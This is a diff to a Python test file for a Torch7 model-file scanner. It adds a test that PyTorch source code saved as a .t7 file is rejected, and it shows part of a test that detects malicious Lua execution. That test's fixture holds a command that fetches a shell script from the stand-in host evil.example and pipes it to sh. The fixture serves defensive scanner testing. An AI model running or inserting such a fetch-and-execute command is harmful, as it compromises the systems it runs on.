@@ -28,6 +28,16 @@ def test_can_handle_rejects_non_torch7_content(tmp_path: Path) -> None:
     assert not Torch7Scanner.can_handle(str(path))
 
 
+def test_can_handle_rejects_pytorch_source_markers(tmp_path: Path) -> None:
+    path = _write_torch7_file(
+        tmp_path,
+        b"import torch\nimport torch.nn as nn\n\nclass Model(nn.Module):\n    pass\n",
+        filename="source.t7",
+    )
+
+    assert not Torch7Scanner.can_handle(str(path))
+
+
 def test_scan_detects_lua_execution_with_network_context(tmp_path: Path) -> None:
     payload = (
         b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
